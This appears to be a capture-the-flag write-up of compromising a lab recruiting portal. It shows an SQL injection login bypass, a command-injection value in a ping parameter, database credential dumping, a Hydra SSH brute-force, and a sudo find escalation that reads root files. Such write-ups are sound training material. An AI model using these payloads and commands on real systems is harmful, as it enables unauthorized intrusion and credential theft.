# Operation Promotion: RecruitCorp Compromise Writeup

## Overview
This engagement involved the complete compromise of RecruitCorp's public-facing portal, leading to user-level access and subsequent root privilege escalation.

**Target IP:** 10.48.166.175 (Initial: 10.48.183.212)
**Goal:** Capture `user.txt` and `flag.txt`.

---

## 1. Reconnaissance

### Service Scanning
An initial Nmap scan revealed the following open ports:
- **22/tcp:** OpenSSH 9.6p1
- **80/tcp:** Apache httpd 2.4.58
- **139/445/tcp:** Samba 4.6.2 (outdated)

```bash
nmap -sC -sV -oN nmap_initial.txt 10.48.166.175
```

### Web Enumeration
- **Robots.txt:** Revealed a disallowed `/admin/` directory.
- **Admin Portal:** A login form was found at `http://recruitcorp.thm/admin/`.

---

## 2. Exploitation

### Entry Point: SQL Injection
The admin login form was vulnerable to a classic SQL injection bypass.
- **Payload:** `admin' OR '1'='1`
- **Impact:** Administrative access to the portal dashboard without a valid password.

### Remote Code Execution (RCE)
Within the admin dashboard, a system maintenance utility was discovered at `/admin/sysmaint-checks/ping.php`. This tool took a `host` parameter and passed it directly to a shell command.

- **Vulnerable URL:** `http://recruitcorp.thm/admin/sysmaint-checks/ping.php?host=127.0.0.1;id`
- **Execution:** Confirmed RCE as the `www-data` user.

---

## 3. Internal Enumeration

### Database Extraction
Using the RCE, the application database was located at `/var/lib/recruitcorp/app.db`.
```bash
sqlite3 /var/lib/recruitcorp/app.db "SELECT * FROM users;"
```
**Discovered Credentials:**
- `admin:A!7s2f9DkLp_Q3e`
- `mvasquez:pw_mv_4831`
- `sysmaint:pw_sm_8841`
- (and several other recruiters following the `pw_<initials>_XXXX` pattern)

### Sensitive Configuration
A configuration file `/var/www/html/config/db.conf` revealed a bcrypt hash for the system user `jford`.
- **Hash:** `$2b$10$QzkXmGndA2cQLozO3xAN6eWKrl6ZXyzhYTJNF67exOmTmN5oVSEfq`

---

## 4. Lateral Movement

### Custom Wordlist Generation
Initial cracking attempts on the hash using standard wordlists failed. Based on the "Spring 2026" clue on the website, a custom wordlist was generated using `cewl` and manual mangling.

```bash
# Extract base words from the target site
cewl http://10.48.166.175/ -w cewl_words.txt

# Create variations (appending year and symbol)
# Script used:
# for word in words:
#     output.append(word + "2026!")
```

### SSH Access
Testing the mangled wordlist with Hydra identified the valid system password:
- **User:** `jford`
- **Password:** `spring2026!`

```bash
hydra -l jford -P custom_wordlist.txt ssh://10.48.166.175 -f -V
```

---

## 5. Privilege Escalation

### Identifying the Path
Checking sudo privileges for `jford` revealed a configuration allowing the execution of `/usr/bin/find` as root without a password.

```bash
jford@recruitcorp:~$ sudo -l
(root) NOPASSWD: /usr/bin/find
```

### GTFOBins Exploitation
The `find` binary can execute arbitrary commands via the `-exec` flag. This was used to read the root flag directly from the root-only directory.

```bash
sudo find /root -name flag.txt -exec cat {} \;
```

---

## 6. Findings and Artifacts

### Flags
- **User Flag (`/home/jford/user.txt`):** `THM{bdbee0a91ebcb0b0fafde931223efe09}`
- **Root Flag (`/root/flag.txt`):** `THM{d999a1f6319a9c5b48c067dfab314ba2}`

### Key Lessons
1.  **Custom Wordlists:** Website content (slogans, dates, specific terminology) often forms the basis of employee passwords. Tools like `cewl` combined with `hashcat` rules are highly effective.
2.  **Sudo Misconfigurations:** Always check `sudo -l`. Binaries like `find`, `vim`, or `awk` provide easy privilege escalation if granted sudo rights.
3.  **Hash Identification:** Standard bcrypt hashes require Hashcat mode **3200**.
